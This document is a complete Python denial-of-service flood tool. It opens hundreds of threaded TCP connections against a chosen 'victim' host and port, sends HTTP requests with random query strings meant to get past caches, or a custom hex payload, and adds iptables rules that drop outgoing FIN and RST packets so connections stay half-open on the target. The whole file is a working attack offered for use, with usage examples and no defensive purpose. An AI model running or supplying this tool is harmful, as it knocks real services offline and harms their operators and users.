import socket
import random
import string
import signal
import ssl
import argparse
import sys
from time import sleep
from threading import Thread, active_count
from os import system, geteuid

example_text = ''' \nTips : Target Page With 1500+ Bytes Size .

example:
  sudo python %s example.com/test.php -p 80 -http
  sudo python %s example.com/hello/ -p 443 -ssl -http
  sudo python %s example.com -p 80 -http 
  sudo python %s example.com -p 21 -payload 68656c6c6f
  sudo python %s example.com -p 22

Connects - TCP Handshakes Towards Victim
Payloads - Recevied Payloads By Victim
Dropped  - TCP Handshakes Or Payloads Rejected By Victim ( Site Down )
 
''' % (sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0])

parser = argparse.ArgumentParser(epilog=example_text, formatter_class=argparse.RawTextHelpFormatter)
parser._action_groups.pop()
required = parser.add_argument_group('Required Arguments')
optional = parser.add_argument_group('Optional Arguments')

required.add_argument('target', help='Specify A Target To Attack')
required.add_argument('-p', dest='port', help='Specify Port To Attack', type=int, required=True)

optional.add_argument('-t', dest='THREADS', type=int, default=300, help='Threads Default = 300 Threads')
optional.add_argument('-ssl', action='store_true',  help='Enable SSL')
optional.add_argument('-http', action='store_true',  help='Enable HTTP Headers ( Only İf Custom Payload Not Set )')
optional.add_argument('-payload', help='Set Payload As Hex-String')



print("\nProgram Started .\n")
args = parser.parse_args()
connected = 0
dropped = 0
payloads = 0
port = args.port


# Sort out http URI in targets
target = args.target.replace('http://','').replace('https://','')

if '/' in target and args.http:
    path = target[target.find('/'):]
    target = target[:target.find('/')]
else:
    path = '/'


# Decode custom payload
try:
    if args.payload:
        payload = args.payload.decode('hex')
    else:
        payload = ''
except:
    print('Use Hex String Format As Payload .')
    sys.exit()


# Check if script is running as root
if geteuid() != 0:
    print("Run %s as root." % sys.argv[0])
    sys.exit()


# Catch CTRL+C to abort
stop = False
def signal_handler(signal, frame):
    global stop
    stop = True
signal.signal(signal.SIGINT, signal_handler)


# String generator for Cache bypassing on load balancers (Random letters in lenght 3 to 8)
def string_generator(size=random.randint(3, 8), chars=string.ascii_uppercase + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))


# Generate HTTP Payload
def http_payload():
    payload = 'GET %s?%s HTTP/1.1\r\n' %  (path, string_generator())
    payload += 'Host: %s\r\n' % target
    payload += 'User-Agent: Kittenz Launcher!!!\r\n'
    payload += 'Connection: keep-alive\r\n\r\n'
    return payload


# DOS function
def spam(target_ip, payload):
    global connected, dropped, payloads
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 2 sec TCP timeout
        s.settimeout(2)
        try:
            s.connect((target_ip, port))
            connected += 1
            # Wrap connection with SSL if specified
            if args.ssl:
                s = ssl.wrap_socket(s, cert_reqs = ssl.CERT_NONE)
            if args.http and not args.payload:
                payload = http_payload()
            s.send(payload)
            payloads += 1
            s.close()
        except:
            dropped += 1
        if stop == True:
            break


if __name__ == '__main__':
    target_ip = socket.gethostbyname(target)
    # add IP tables to drop FIN and RST packets towards TARGET
    system('iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %( target_ip, port ))
    system('iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %( target_ip, port ))
    # Fire up threads running spam() function
    threads = []
    for i in range(args.THREADS):
        t = Thread(target=spam, args=(target_ip, payload,))
        threads.append(t)
        t.start()

    while True:
        # Keep going until ctrl+c is pressed
        if active_count() == 1 or stop == True:
            # when ctrl+c is pressed, restore IP tables.
            system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %( target_ip, port ))
            system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %( target_ip, port ))
            print("")
            break
        else:
            sleep(0.1)
            sys.stdout.write(' Connects : %d, Payloads : %d, Dropped : %d                   \r' % (connected, payloads, dropped))
            sys.stdout.flush()
